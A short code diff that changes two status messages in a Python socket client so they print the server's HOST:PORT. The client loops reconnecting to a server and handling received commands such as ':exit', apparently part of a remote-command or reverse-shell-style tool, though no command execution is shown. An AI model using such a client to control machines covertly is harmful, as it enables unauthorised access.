@@ -8,7 +8,7 @@ PORT = int(CONFIG['port'])
 
 active = True
 
-print('[.] Connecting to Server')
+print(f'[.] Connecting to {HOST}:{PORT}')
 while active:
 	server = socket.socket()
 	try:		
@@ -22,7 +22,7 @@ while active:
 				break
 			elif command == ':exit':
 				print('[-] Connection Terminated')
-				print('[.] Connecting to Server')
+				print(f'[.] Connecting to {HOST}:{PORT}')
 				break
 			else:
 				try:
